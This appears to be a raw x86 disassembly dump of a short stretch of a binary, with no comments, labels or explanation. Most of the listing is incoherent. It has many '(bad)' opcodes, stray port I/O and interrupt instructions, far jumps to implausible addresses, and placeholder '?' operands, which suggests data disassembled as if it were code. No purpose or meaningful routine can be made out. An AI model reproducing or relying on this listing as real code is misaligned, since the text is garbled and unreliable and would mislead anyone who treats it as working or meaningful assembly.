  438fa7:	mov    dl,BYTE PTR [ebx+0x5e]
  438faa:	retf   0x8766
  438fad:	mov    cl,0xb
  438faf:	in     eax,dx
  438fb0:	imul   dh
  438fb2:	mov    ?,edi
  438fb4:	xchg   ebp,eax
  438fb5:	fld    DWORD PTR [ebx]
  438fb7:	jne    0x43900c
  438fb9:	mov    eax,ds:0xcf213f7
  438fbe:	dec    esp
  438fbf:	xlat   BYTE PTR ds:[ebx]
  438fc0:	das    
  438fc1:	int    0x86
  438fc3:	xor    eax,0x89604f
  438fc8:	add    BYTE PTR [eax],al
  438fca:	add    BYTE PTR [eax],al
  438fcc:	or     esp,ebp
  438fce:	out    0x3,al
  438fd0:	xlat   BYTE PTR ds:[ebx]
  438fd1:	mov    DWORD PTR [ecx-0x65],ebx
  438fd4:	addr16 add ah,bh
  438fd7:	outs   dx,BYTE PTR ds:[esi]
  438fd8:	sbb    ah,0xff
  438fdb:	cdq    
  438fdc:	nop
  438fdd:	loopne 0x438fe5
  438fdf:	push   edi
  438fe0:	(bad)  
  438fe1:	out    dx,eax
  438fe2:	(bad)  
  438fe3:	call   0x704122db
  438fe8:	in     al,0x95
  438fea:	adc    ch,cl
  438fec:	jbe    0x43906b
  438fee:	inc    ebx
  438fef:	(bad)  
  438ff0:	xrelease xchg DWORD PTR [eax],ebp
  438ff3:	bnd jbe 0x438ff8
  438ff6:	test   DWORD PTR [edi-0xe],edx
  438ff9:	std    
  438ffa:	(bad)  
  438ffb:	call   0x188252b6
  439000:	mov    ebx,0x409de7c4
  439005:	pop    ecx
  439006:	stc    
  439007:	ins    BYTE PTR es:[edi],dx
  439008:	cld    
  439009:	mov    DWORD PTR [edi],eax
  43900b:	jmp    0x5fce4286
  439010:	dec    edx
  439011:	add    al,BYTE PTR [eax]
  439013:	jmp    0x52060e19
  439018:	daa    
  439019:	dec    esi
  43901a:	stc    
  43901b:	ss repz cmp eax,0x1f04014
  439022:	add    cl,ch
  439024:	jmp    0x438fad
  439026:	mov    esp,0x850276f7
  43902b:	xchg   esp,eax
  43902c:	add    BYTE PTR [edi+0xeb41],0x0
  439033:	add    BYTE PTR [eax],al
  439035:	sti    
  439036:	dec    edx
  439037:	or     eax,DWORD PTR [edi+0x1984e0c0]
  43903d:	pop    esp
  43903e:	aas    
  43903f:	fisub  WORD PTR [edx+0x44]
  439042:	mul    BYTE PTR [ecx-0x20]
  439045:	fmul   QWORD PTR [edx-0x48916ee]
  43904b:	mov    cl,0x7f
  43904d:	icebp  
  43904e:	hlt    
  43904f:	(bad)  
  439050:	call   0x614b454e
  439055:	jne    0x439058
  439057:	stc    
  439058:	add    BYTE PTR [edx-0x2d49f7b6],cl
  43905e:	ins    DWORD PTR es:[edi],dx
  43905f:	push   cs
  439060:	add    BYTE PTR [edi+edi*2],bl
  439063:	inc    esi
  439064:	adc    al,0x97
  439066:	mov    WORD PTR [ecx],es
  439068:	mov    BYTE PTR [eax+0x55],dh
  43906b:	test   BYTE PTR [esi-0x6b350],dl
  439071:	jecxz  0x4390af
  439073:	or     eax,0xc21ffcb1
  439078:	data16 (bad) 
  43907b:	jp     0x43903f
  43907d:	outs   dx,DWORD PTR ds:[esi]
  43907e:	jge    0x43900e
  439080:	mov    esp,0x660005ca
  439085:	push   ebp
  439086:	jl     0x439040
  439088:	push   ss
  439089:	int3   
  43908a:	add    eax,0x16ba13e3
  43908f:	loopne 0x4390f7
  439091:	aad    0x7b
  439093:	mov    eax,0x7b05cc16
  439098:	rol    DWORD PTR [eax],0x0
  43909b:	add    BYTE PTR [eax],al
  43909d:	add    bh,cl
  43909f:	jl     0x439027
  4390a1:	mov    esp,0x680005ca
  4390a6:	in     al,0x3d
  4390a8:	cmp    DWORD PTR [eax],eax
  4390aa:	mov    ah,0xad
  4390ac:	cmp    al,BYTE PTR [eax-0x74]
  4390af:	jle    0x43906f
  4390b1:	call   0x3a4ab2
  4390b6:	pop    ds
  4390b7:	mov    edx,0xde4a8b07
  4390bc:	cmp    eax,0x7ce373e8
  4390c1:	(bad)  
  4390c2:	call   0x750a13c1
  4390c7:	out    dx,eax
  4390c8:	lock call DWORD PTR [ebx+0x42]
  4390cc:	push   edi
  4390cd:	pop    ebx
  4390ce:	out    0xe8,eax
  4390d0:	push   esp
  4390d1:	ret    
  4390d2:	and    cl,al
  4390d4:	retf   
  4390d5:	int3   
  4390d6:	jne    0x4390e6
  4390d8:	mov    ebp,esp
  4390da:	out    dx,al
  4390db:	in     eax,dx
  4390dc:	or     ecx,DWORD PTR [ebp-0x12]
  4390df:	and    eax,0x41fe50f4
  4390e4:	ds jmp 0xf9a16b6f
  4390ea:	and    bl,BYTE PTR [ebx-0x3]
  4390ed:	jl     0x43910d
  4390ef:	pop    edx
  4390f0:	shr    BYTE PTR [esi+edi*8],cl
  4390f3:	and    eax,0x4ac30910
  4390f8:	add    al,0xc6
  4390fa:	hlt    
  4390fb:	jno    0x43914b
  4390fd:	stc    
  4390fe:	jne    0x43915b
  439100:	rol    DWORD PTR [ecx],cl
  439102:	add    BYTE PTR [eax],al
  439104:	add    BYTE PTR [eax],al
  439106:	add    ah,dh
  439108:	jno    0x439158
  43910a:	stc    
  43910b:	jne    0x439168
  43910d:	add    al,0xf7
  43910f:	hlt    
  439110:	fisttp WORD PTR [ebp-0x7]
  439113:	jne    0x439170
  439115:	rol    DWORD PTR [ecx],cl
  439117:	hlt    
  439118:	mov    edi,0x5b75f94d
  43911d:	mov    ecx,es
  43911f:	mov    ah,0xba
  439121:	in     al,dx
  439122:	pop    eax
  439123:	outs   dx,BYTE PTR ds:[esi]
  439124:	sbb    bh,BYTE PTR [edx+ebx*2+0x51fd5eb7]
  43912b:	dec    BYTE PTR [ebp-0x6a547cf7]
  439131:	or     ecx,DWORD PTR [ebx+0x58bf5a33]
  439137:	mov    es,WORD PTR cs:[ebx+0xc]
  43913b:	jne    0x439119
  43913d:	pop    ebx
  43913e:	adc    BYTE PTR [esi],al
  439140:	pushf  
  439141:	adc    ch,0x1
  439144:	sub    eax,0x5999a48a
  439149:	std    
  43914a:	push   DWORD PTR [ebp+0x68]
  43914d:	xchg   edi,eax
  43914e:	add    dh,BYTE PTR [esi+0x21]
  439151:	(bad)  
  439152:	cld    
  439153:	pop    ebp
  439154:	add    ebp,DWORD PTR [esi]
  439156:	fld    DWORD PTR [edi-0x7e]
  439159:	loopne 0x4391b0
  43915b:	dec    esp
  43915c:	add    esp,edi
  43915e:	shl    DWORD PTR [ecx+eax*4-0x40],1
  439162:	push   ebp
  439163:	cmp    al,0x3
  439165:	out    0x9b,eax
  439167:	mov    ds:0x83e282,al
  43916c:	add    BYTE PTR [eax],al
  43916e:	add    BYTE PTR [eax],al
  439170:	and    al,0x68
  439172:	test   al,0x6a
  439174:	ins    BYTE PTR es:[edi],dx
  439175:	jnp    0x43911c
  439177:	inc    ebp
  439178:	adc    eax,0x1041ce07
  43917d:	dec    ecx
  43917e:	cmp    DWORD PTR [ebp+0x15],eax
  439181:	repz xor DWORD PTR [ebx],ecx
  439184:	ret    0x2bab
  439187:	inc    edx
  439188:	imul   eax,DWORD PTR [edx],0xf6255b68
  43918e:	out    0x3,al
  439190:	jl     0x439116
  439192:	xchg   ebp,eax
  439193:	add    al,0x75
  439195:	add    ch,BYTE PTR [edi]
  439197:	scas   eax,DWORD PTR es:[edi]
  439198:	adc    ah,cl
  43919a:	rcl    BYTE PTR [esi-0x50],0x41
  43919e:	dec    ebp
  43919f:	or     esi,edx
  4391a1:	mov    ch,0xe2
  4391a3:	test   al,bl
  4391a5:	xchg   edx,eax
  4391a6:	hlt    
  4391a7:	add    esi,DWORD PTR [ebp-0x76]
  4391aa:	sahf   
  4391ab:	add    al,0x75
  4391ad:	add    ch,BYTE PTR [eax+ebp*8+0x56]
  4391b1:	add    ah,dl
  4391b3:	xchg   ebp,eax
  4391b4:	xchg   DWORD PTR [ebx],eax
  4391b6:	sbb    eax,0xe7b8e70f
  4391bb:	add    cl,BYTE PTR [edx-0x38f0d2fd]
  4391c1:	mov    eax,0x38a02e4
  4391c6:	sbb    eax,0xe5b8c70f
  4391cb:	add    ch,BYTE PTR [edx+0x3]
  4391ce:	sub    eax,0xffb8270f
  4391d3:	in     al,dx
  4391d4:	add    BYTE PTR [eax],al
  4391d6:	add    BYTE PTR [eax],al
  4391d8:	add    BYTE PTR [edi+0x57],dh
  4391db:	std    
  4391dc:	and    ch,BYTE PTR [edx-0x6c]
  4391df:	push   edx
  4391e0:	in     al,dx
  4391e1:	ja     0x43923a
  4391e3:	std    
  4391e4:	mov    dl,0x7b
  4391e6:	xchg   esp,eax
  4391e7:	push   edx
  4391e8:	out    dx,eax
  4391e9:	ja     0x439242
  4391eb:	std    
  4391ec:	mov    ds:0xee52946b,al
  4391f1:	ja     0x43924a
  4391f3:	std    
  4391f4:	mov    dl,0x7b
  4391f6:	xchg   esp,eax
  4391f7:	push   edx
  4391f8:	loope  0x439271
  4391fa:	push   edi
  4391fb:	std    
  4391fc:	mov    ds:0xf052946b,al
  439201:	ja     0x43925a
  439203:	std    
  439204:	mov    dl,0x7b
  439206:	xchg   esp,eax
  439207:	push   edx
  439208:	jecxz  0x439281
  43920a:	push   edi
  43920b:	std    
  43920c:	mov    ds:0xf252946b,al
  439211:	ja     0x43926a
  439213:	std    
  439214:	mov    dl,0x7b
  439216:	xchg   esp,eax
  439217:	push   edx
  439218:	in     eax,0x77
  43921a:	push   edi
  43921b:	std    
  43921c:	mov    ds:0xf452946b,al
  439221:	ja     0x43927a
  439223:	std    
  439224:	xor    bh,BYTE PTR [ebx-0x6c]
  439227:	push   edx
  439228:	out    0x77,eax
  43922a:	push   edi
  43922b:	std    
  43922c:	and    ch,BYTE PTR [ebx-0x6c]
  43922f:	push   edx
  439230:	div    BYTE PTR [edi+0x57]
  439233:	std    
  439234:	xor    dh,BYTE PTR [edi+0x57]
  439237:	jge    0x439268
  439239:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43923a:	(bad)  
  43923b:	or     BYTE PTR [eax+eax*1+0x0],ah
  43923f:	add    BYTE PTR [eax],al
  439241:	add    bl,al
  439243:	dec    ecx
  439244:	stc    
  439245:	es out dx,al
  439247:	fidivr WORD PTR [edi-0x1a]
  43924a:	not    BYTE PTR [eax-0x21]
  43924d:	sub    BYTE PTR [ecx+edi*8],cl
  439250:	cmp    bp,WORD PTR [ebx+0x2]
  439254:	stc    
  439255:	add    BYTE PTR [ebx+0x0],bh
  439258:	ret    0xedb8
  43925b:	cmp    edi,0xb8e8637f
  439261:	jmp    0xaf5c:0xfcb5f3b
  439268:	test   BYTE PTR [ebx],0x56
  43926b:	mov    al,0x44
  43926d:	or     al,0x5b
  43926f:	test   DWORD PTR [ebx],esi
  439271:	jmp    FWORD PTR [ebx]
  439273:	mov    al,0x7c
  439275:	fld    TBYTE PTR [ebx]
  439277:	xchg   cl,cl
  439279:	add    BYTE PTR [edx+eax*1],bl
  43927c:	jnp    0x439279
  43927e:	cmp    al,0xff
  439280:	jns    0x439217
  439282:	or     al,0x2
  439284:	add    BYTE PTR [ebx+0x4e7c1df],cl
  43928a:	cdq    
  43928b:	pop    edx
  43928c:	sbb    eax,0xe781b00
  439291:	add    edx,esi
  439293:	jmp    FWORD PTR [ebp-0xefd22aa]
  439299:	add    esp,DWORD PTR [esi]
  43929b:	add    BYTE PTR [esi-0xefd31aa],ch
  4392a1:	add    edx,DWORD PTR [esi]
  4392a3:	add    BYTE PTR [esi+0x56],ch
  4392a9:	add    BYTE PTR [eax],al
  4392ab:	fild   WORD PTR [edx]
  4392ad:	icebp  
  4392ae:	add    eax,DWORD PTR [esi-0x2fa95201]
  4392b4:	add    dh,cl
  4392b6:	add    edx,DWORD PTR [esi-0x5ea95201]
  4392bc:	add    dh,cl
  4392be:	add    esp,DWORD PTR [esi-0x1]
  4392c1:	lods   eax,DWORD PTR ds:[esi]
  4392c2:	push   esi
  4392c3:	xchg   edx,eax
  4392c4:	add    dh,cl
  4392c6:	add    edx,DWORD PTR [esi-0x1]
  4392c9:	lods   eax,DWORD PTR ds:[esi]
  4392ca:	push   esi
  4392cb:	mov    ds:0x4603f102,eax
  4392d0:	jmp    FWORD PTR [ebp+0x637556]
  4392d6:	div    DWORD PTR [esi+0x21]
  4392d9:	or     esi,DWORD PTR [edx-0x8ffad35]
  4392df:	jbe    0x4392f2
  4392e1:	or     esi,DWORD PTR [edx-0x8ff9e35]
  4392e7:	jbe    0x43930a
  4392e9:	or     esi,DWORD PTR [edx-0x8ffaf55]
  4392ef:	jbe    0x439282
  4392f1:	or     al,0xb2
  4392f3:	stos   DWORD PTR es:[edi],eax
  4392f4:	addr16 add bh,dh
  4392f7:	jbe    0x43929a
  4392f9:	or     al,0xb2
  4392fb:	retf   
  4392fc:	push   esi
  4392fd:	add    bh,dh
  4392ff:	jbe    0x439292
  439301:	or     al,0xb2
  439303:	retf   
  439304:	gs add bh,dh
  439307:	jbe    0x4392aa
  439309:	or     al,0xb2
  43930b:	stos   DWORD PTR es:[edi],eax
  43930c:	push   esp
  43930d:	add    bh,dh
  43930f:	add    BYTE PTR [eax],al
  439311:	add    BYTE PTR [eax],al
  439313:	add    BYTE PTR [esi-0x6f],dh
  439316:	and    ch,0x65
  439319:	pop    eax
  43931a:	push   esi
  43931b:	jge    0x439350
  43931d:	dec    ebx
  43931e:	lds    ecx,FWORD PTR [eax]
  439320:	clc    
  439321:	dec    esi
  439322:	pop    esp
  439323:	stc    
  439324:	jmp    0x9364:0x6e7437e5
  43932b:	add    dh,BYTE PTR [esi-0x5d]
  43932e:	ret    
  43932f:	cld    
  439330:	int    0x8f
  439332:	shl    dl,cl
  439334:	or     eax,0xf5017d2a
  439339:	stos   DWORD PTR es:[edi],eax
  43933a:	pop    ebp
  43933b:	mov    edi,0xcde62bcf
  439340:	sbb    BYTE PTR [ebx+0x5c],0xf9
  439344:	jbe    0x439357
  439346:	xchg   ebp,eax
  439347:	outs   dx,DWORD PTR ds:[esi]
  439348:	cmc    
  439349:	pop    ebx
  43934a:	jge    0x43933d
  43934c:	xchg   edx,eax
  43934d:	sbb    DWORD PTR [edi+0x9],esp
  439350:	sbb    al,0x2
  439352:	xor    eax,0x1a4d750c
  439357:	add    BYTE PTR [ebx-0x4442d588],cl
  43935d:	popa   
  43935e:	idiv   DWORD PTR [ecx+edi*2+0x28be9e41]
  439365:	jmp    esi
  439367:	dec    edi
  439368:	xor    DWORD PTR [edi],edi
  43936a:	pushf  
  43936b:	mov    BYTE PTR [ecx-0x4b],cl
  43936e:	pop    ebp
  43936f:	(bad)  
  439370:	add    BYTE PTR [ebp+0x777bd0d9],0x2c
  439377:	or     al,0x0
  439379:	add    BYTE PTR [eax],al
  43937b:	add    BYTE PTR [eax],al
  43937d:	clc    
  43937e:	(bad)
  439381:	sub    eax,0x898bf779
  439386:	add    DWORD PTR [edi],esp
  439388:	retf   0x53a7
  43938b:	sbb    DWORD PTR [ecx-0x70e3c11f],edi
  439391:	or     DWORD PTR [eax+0x1c],edi
  439394:	or     dh,dh
  439396:	cmp    DWORD PTR [ebx],ebx
  439398:	or     eax,esi
  43939a:	(bad)
  43939d:	mov    edx,0x7504a902
  4393a2:	ret    0xd11f
  4393a5:	jmp    0x439354
  4393a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4393a8:	dec    eax
  4393a9:	mov    ecx,0xb148ab3e
  4393ae:	ds sbb al,0xb3
  4393b1:	inc    esp
  4393b2:	scas   eax,DWORD PTR es:[edi]
  4393b3:	gs push 0x1fbb7799
  4393b9:	lea    esi,[edi-0x55]
  4393bc:	pop    ds
  4393bd:	xor    DWORD PTR [edi-0x5b],0x5b68f1db
  4393c4:	add    al,0x75
  4393c6:	add    bh,dh
  4393c8:	inc    esi
  4393c9:	lock shl dl,0x8e
  4393cd:	dec    ebx
  4393ce:	into   
  4393cf:	push   DWORD PTR [ebx+esi*2-0x3c141a75]
  4393d6:	mov    ebp,ds
  4393d8:	stc    
  4393d9:	jnp    0x439405
  4393db:	xchg   ebp,edi
  4393dd:	bound  eax,QWORD PTR [ebp+0x797e]
  4393e3:	add    BYTE PTR [eax],al
  4393e5:	add    BYTE PTR [ecx+0x2],dh
  4393e8:	add    BYTE PTR [edx+0x33],ah
  4393eb:	iret   
  4393ec:	xor    al,0x21
  4393ee:	dec    ebp
  4393ef:	dec    ebp
  4393f0:	xchg   BYTE PTR [ecx],ah
  4393f2:	lock lods eax,DWORD PTR ds:[esi]
  4393f4:	and    edx,ecx
  4393f6:	jmp    0x4393d3
  4393f8:	aaa    
  4393f9:	pusha  
  4393fa:	and    eax,0x5872041f
  4393ff:	xlat   BYTE PTR ds:[ebx]
  439400:	mov    bl,BYTE PTR [ebp+0x64]
  439403:	add    al,BYTE PTR [edi-0x7add6aab]
  439409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43940a:	(bad)  
  43940b:	sub    bh,BYTE PTR [ebp-0x37]
  43940e:	jae    0x439393
  439410:	inc    esp
  439411:	add    eax,0x53e8625
  439416:	dec    esp
  439417:	add    bh,bh
  439419:	call   0x272bb994
  43941e:	jae    0x43943d
  439420:	jmp    0x439494
  439422:	cmp    bl,dl
  439424:	xchg   BYTE PTR ds:0x98fcee55,ch
  43942a:	add    esi,edx
  43942c:	and    esi,ecx
  43942e:	jg     0x4393c1
  439430:	sbb    DWORD PTR [eax+0x2a],esi
  439433:	pop    ds
  439434:	adc    dh,ah
  439436:	pop    es
  439437:	scas   al,BYTE PTR es:[edi]
  439438:	aaa    
  439439:	outs   dx,BYTE PTR ds:[esi]
  43943a:	add    DWORD PTR [esi-0x2c040add],ebp
  439440:	aas    
  439441:	jb     0x439415
  439443:	push   ds
  439444:	in     eax,0xf4
  439446:	in     eax,dx
  439447:	ret    0x9ff
  43944a:	add    BYTE PTR [eax],al
  43944c:	add    BYTE PTR [eax],al
  43944e:	add    BYTE PTR [ebx-0x7],al
  439451:	mov    al,0x0
  439453:	mov    al,ds:0x93cd3437
  439458:	and    al,0x0
  43945b:	mov    esi,?
  43945d:	js     0x439449
  43945f:	pushf  
  439460:	(bad)  
  439461:	clc    
  439462:	inc    DWORD PTR [ebx-0x73ff2b8a]
  439468:	inc    BYTE PTR [esi]
  43946a:	mov    bh,0xc8
  43946c:	cmc    
  43946d:	idiv   BYTE PTR [ebx]
  43946f:	lahf   
  439470:	xor    dl,dh
  439472:	mov    ebx,DWORD PTR [eax]
  439474:	jmp    0x3afa:0x49ab0f03
  43947b:	or     dl,ch
  43947d:	pcmpeqw mm6,QWORD PTR [ebx+0x76]
  439481:	adc    al,0x24
  439483:	(bad)  
  439484:	xor    bl,BYTE PTR ds:0x1d2ac704
  43948a:	and    BYTE PTR [edi-0x4b],cl
  43948d:	add    BYTE PTR [eax+edi*2+0x52],0xb3
  439492:	clc    
  439493:	xor    ch,BYTE PTR [esi+esi*8+0x7e6a08d]
  43949a:	add    DWORD PTR [esi+eax*1],ecx
  43949d:	test   DWORD PTR [esp+ecx*1+0x1cfff8fe],esi
  4394a4:	ja     0x4394aa
  4394a6:	xor    bl,BYTE PTR [edi]
  4394a8:	dec    edx
  4394a9:	xor    esi,DWORD PTR [ebp-0x8]
  4394ac:	jbe    0x4394f2
  4394ae:	xor    bl,al
  4394b0:	out    dx,al
  4394b1:	inc    ebx
  4394b2:	cmp    al,BYTE PTR [eax]
  4394b4:	add    BYTE PTR [eax],al
  4394b6:	add    BYTE PTR [eax],al
  4394b8:	fdivr  DWORD PTR [eax]
  4394ba:	add    BYTE PTR [ebx-0x169308f2],al
  4394c0:	div    DWORD PTR ds:0x9cd8c27c
  4394c6:	idiv   edi
  4394c8:	fadd   QWORD PTR ds:0xc04f066d
  4394ce:	stc    
  4394cf:	shl    BYTE PTR [ebp-0x3d],0xf3
  4394d3:	sub    esi,DWORD PTR [esp+ebx*8+0x31]
  4394d7:	add    al,bh
  4394d9:	push   edi
  4394da:	sbb    eax,DWORD PTR [ebp+0x2523ff21]
  4394e0:	mov    dl,0x4e
  4394e2:	add    edi,edi
  4394e4:	xchg   edx,eax
  4394e5:	pop    ebx
  4394e6:	ror    BYTE PTR [ebx-0x2],cl
  4394e9:	xchg   DWORD PTR [ecx],ebx
  4394eb:	cmp    dh,ch
  4394ed:	xchg   DWORD PTR [ecx],ebx
  4394ef:	sbb    al,0x3e
  4394f1:	sbb    al,0xd7
  4394f3:	or     al,0xfe
  4394f5:	outs   dx,BYTE PTR ds:[esi]
  4394f6:	sbb    DWORD PTR [eax],ecx
  4394f8:	inc    BYTE PTR [ebp+edi*4+0x13fc184]
  4394ff:	test   DWORD PTR [ecx+0x524a6637],eax
  439505:	pop    eax
  439506:	pop    eax
  439507:	test   DWORD PTR [ecx-0x46790409],ebp
  43950d:	push   edi
  43950f:	xchg   BYTE PTR [edi-0x4f42e555],ch
  439515:	inc    esi
  439516:	mov    WORD PTR [ecx+edx*2+0x57],?
  43951a:	add    al,0xf0
  43951c:	add    BYTE PTR [eax],al
  43951e:	add    BYTE PTR [eax],al
  439520:	add    ah,ch
  439522:	push   cs
  439523:	and    BYTE PTR [eax],cl
  439525:	push   0xffffffc8
  439527:	mov    al,0x37
  439529:	adc    ah,ah
  43952b:	fidivr DWORD PTR [edi]
  43952d:	cld    
  43952e:	mov    esi,0x4eee0c1f
  439533:	sbb    edi,esp
  439535:	push   esp
  439536:	jo     0x439590
  439538:	stc    
  439539:	dec    BYTE PTR [esi]
  43953b:	and    BYTE PTR [eax],bh
  43953d:	mov    dl,0x16
  43953f:	and    BYTE PTR [edi+esi*2],bl
  439542:	pop    edx
  439543:	std    
  439544:	(bad)  
  439545:	in     al,dx
  439546:	and    al,0xd4
  439548:	test   BYTE PTR [ecx],ch
  43954a:	aas    
  43954b:	adc    eax,0xb022985
  439550:	clc    
  439551:	stc    
  439552:	ret    
  439553:	rcr    BYTE PTR [ebx*4-0xf731b38],cl
  43955a:	test   BYTE PTR [ebx],ah
  43955c:	pop    ds
  43955d:	inc    eax
  43955e:	test   al,0xa1
  439560:	mov    dh,0xe1
  439562:	inc    esp
  439563:	sub    eax,DWORD PTR [edi-0x57]
  439566:	xor    eax,0x23a86e7
  43956b:	out    0x86,eax
  43956d:	xor    al,BYTE PTR [edx]
  43956f:	out    0x86,eax
  439571:	cmp    al,BYTE PTR [edx]
  439573:	out    0x86,eax
  439575:	xor    al,BYTE PTR [edx]
  439577:	out    0x3,eax
  439579:	jne    0x43957d
  43957b:	call   0xe6460a83
  439580:	add    esi,DWORD PTR [ebp+0x2]
  439583:	loop   0x439588
  439585:	add    BYTE PTR [eax],al
  439587:	add    BYTE PTR [eax],al
  439589:	add    BYTE PTR [ebp+0x2],dh
  43958c:	loop   0x439591
  43958e:	jne    0x439592
  439590:	retf   0x7503
  439593:	add    ah,BYTE PTR [edx]
  439595:	add    al,0x75
  439597:	add    bl,BYTE PTR [edx+0x4]
  43959a:	jne    0x43959e
  43959c:	rol    BYTE PTR [esi*2+0x7505ca02],cl
  4395a3:	add    al,dl
  4395a5:	add    esi,DWORD PTR [ebp+0x2]
  4395a8:	mov    edx,0xb2481aff
  4395ad:	pop    es
  4395ae:	jne    0x4395b2
  4395b0:	stos   BYTE PTR es:[edi],al
  4395b1:	test   DWORD PTR [edx],0x7517a248
  4395b7:	add    bl,BYTE PTR [edx-0x6db80529]
  4395bd:	push   edi
  4395be:	jne    0x4395c2
  4395c0:	mov    dl,BYTE PTR [edi-0x16]
  4395c3:	inc    edi
  4395c4:	adc    BYTE PTR [edi-0x20],0x47
  4395c8:	jp     0x439621
  4395ca:	je     0x4395ce
  4395cc:	add    BYTE PTR [esi+0x2a],dh
  4395cf:	stc    
  4395d0:	jmp    FWORD PTR [ebp+0x22]
  4395d3:	jmp    0x96dfbd7
  4395d8:	add    BYTE PTR [esi+0x22],bl
  4395db:	leave  
  4395dc:	call   DWORD PTR [ebp+0x4a]
  4395df:	dec    ecx
  4395e0:	add    BYTE PTR [esi+0x42],cl
  4395e3:	dec    ecx
  4395e4:	inc    DWORD PTR [ebp+0x4a]
  4395e7:	dec    ecx
  4395e8:	std    
  4395e9:	cmp    eax,0x36014942
  4395ee:	add    BYTE PTR [eax],al
  4395f0:	add    BYTE PTR [eax],al
  4395f2:	add    BYTE PTR [edx],ch
  4395f4:	dec    ecx
  4395f5:	or     DWORD PTR [esi],ebp
  4395f7:	and    cl,BYTE PTR [ecx+0x19]
  4395fa:	sub    cl,BYTE PTR es:[ecx+0x39]
  4395fe:	push   ds
  4395ff:	and    cl,BYTE PTR [ecx+0x79]
  439602:	push   ss
  439603:	retf   0xf949
  439606:	mov    dh,0x18
  439608:	mov    ah,0x4c
  43960a:	not    BYTE PTR gs:[ebp+0x40]
  43960e:	std    
  43960f:	out    dx,eax
  439610:	int    0x23
  439612:	xchg   ecx,eax
  439613:	dec    ebx
  439615:	sbb    esp,DWORD PTR [edx+0x1b]
  439618:	add    eax,DWORD PTR [ebp+0x7d3277ef]
  43961e:	shr    DWORD PTR [edi+0x7f],cl
  439621:	inc    esp
  439622:	or     eax,0x5547f5d
  439627:	and    eax,0xdd0d6c7e
  43962c:	jge    0x439678
  43962e:	(bad)  
  439630:	stos   DWORD PTR es:[edi],eax
  439631:	or     eax,DWORD PTR [edx]
  439633:	mov    al,ds:0x9feadb51
  439638:	(bad)  
  439639:	out    0xe8,al
  43963b:	jns    0x43963f
  43963d:	add    dl,ch
  43963f:	scas   eax,DWORD PTR es:[edi]
  439640:	jg     0x43969e
  439642:	int    0x8a
  439644:	jg     0x4396b2
  439646:	lds    ebx,FWORD PTR [esi-0x4fffb381]
  43964c:	push   edx
  43964d:	test   BYTE PTR [edi-0x78],al
  439650:	jnp    0x439699
  439652:	push   eax
  439653:	push   ebp
  439654:	xchg   DWORD PTR ds:0x8,ebx
  43965a:	add    BYTE PTR [eax],al
  43965c:	push   ebp
  43965d:	aas    
  43965e:	sbb    eax,0xfffe140c
  439663:	dec    esp
  439665:	jnp    0x4396ae
  439667:	push   esp
  439668:	outs   dx,DWORD PTR ds:[esi]
  439669:	jecxz  0x4396b2
  43966b:	mov    DWORD PTR [eax-0x73fe481a],edx
  439671:	add    al,BYTE PTR [eax]
  439673:	mov    ecx,ebx
  439675:	mov    cl,ah
  439677:	loopne 0x43964d
  439679:	jne    0x4396bf
  43967b:	and    al,0x90
  43967d:	jnp    0x4396be
  43967f:	sub    BYTE PTR [edi],al
  439681:	inc    eax
  439682:	sub    DWORD PTR [ebx+0x4480f6c3],ecx
  439688:	inc    eax
  439689:	test   BYTE PTR [eax-0x7f0dcfb4],0x54
  439690:	xor    dl,ch
  439692:	sub    BYTE PTR [edi+0x34],0x79
  439696:	push   edi
  439697:	cmp    al,0xd7
  439699:	xor    eax,0x3dd72c1d
  43969e:	sbb    eax,0x6ebc9714
  4396a3:	and    cl,bh
  4396a5:	rol    DWORD PTR [edx],0x2b
  4396a8:	fisub  DWORD PTR [esi+0xc]
  4396ab:	add    BYTE PTR [edx+eax*1],bl
  4396ae:	and    eax,ecx
  4396b0:	test   eax,0xdf1c1d2a
  4396b5:	mov    ds:0xc20fc883,al
  4396ba:	jmp    0x1c:0x1d32a9aa
  4396c1:	add    BYTE PTR [eax],al
  4396c3:	add    BYTE PTR [eax],al
  4396c5:	test   DWORD PTR [edx],esi
  4396c7:	sbb    eax,0xf046e714
  4396cc:	(bad)  
  4396cd:	jne    0x439727
  4396cf:	std    
  4396d0:	push   DWORD PTR [ebp-0x11]
  4396d3:	repz sub al,0xb5
  4396d6:	sar    ecx,1
  4396d8:	inc    ecx
  4396d9:	out    dx,al
  4396da:	nop
  4396db:	jg     0x43969a
  4396dd:	jge    0x439747
  4396df:	fs add eax,0x856c80dd
  4396e5:	inc    ecx
  4396e6:	not    DWORD PTR [edi]
  4396e8:	jge    0x439762
  4396ea:	fwait
  4396eb:	cmp    eax,0x459753d
  4396f0:	test   ah,bh
  4396f2:	pop    ecx
  4396f3:	std    
  4396f4:	jmp    FWORD PTR [edx]
  4396f6:	xor    BYTE PTR [ebp+0x7169444c],ch
  4396fc:	test   DWORD PTR [ecx-0x9],edi
  4396ff:	jl     0x439735
  439701:	push   ecx
  439702:	pop    ebx
  439703:	std    
  439704:	pop    ds
  439705:	jne    0x439785
  439707:	js     0x43975f
  439709:	inc    esi
  43970a:	or     edx,eax
  43970c:	inc    ebx
  43970d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43970e:	sbb    eax,DWORD PTR [ebx]
  439710:	sahf   
  439711:	hlt    
  439712:	out    dx,eax
  439713:	mov    edx,0xc9c6d362
  439718:	aaa    
  439719:	hlt    
  43971a:	add    edx,esp
  43971c:	jae    0x4396f6
  43971e:	jg     0x4396ea
  439720:	das    
  439721:	hlt    
  439722:	push   eax
  439723:	out    0x69,al
  439725:	fcom   DWORD PTR [edx]
  439727:	leave  
  439728:	daa    
  439729:	add    BYTE PTR [eax],al
  43972b:	add    BYTE PTR [eax],al
  43972d:	add    ch,bh
  43972f:	pop    ecx
  439730:	std    
  439731:	push   DWORD PTR [ebp+0x5c]
  439734:	lahf   
  439735:	mov    edi,0xe080631d
  43973a:	jb     0x439714
  43973c:	push   esp
  43973d:	add    ah,BYTE PTR [eax+0x75be4c2d]
  439743:	pop    ebx
  439744:	jge    0x439746
  439746:	sbb    BYTE PTR [ecx+0x68],0xc
  43974a:	cmp    al,BYTE PTR [edx]
  43974c:	in     al,dx
  43974d:	ret    
  43974e:	mov    edx,0x7501e6c0
  439753:	add    ah,bh
  439755:	push   0xc3e43d73
  43975a:	and    al,cl
  43975c:	out    0x0,al
  43975e:	jne    0x439762
  439760:	out    0xb9,eax
  439762:	sub    ebp,DWORD PTR [ecx+0x71f4690e]
  439768:	addr16 pop eax
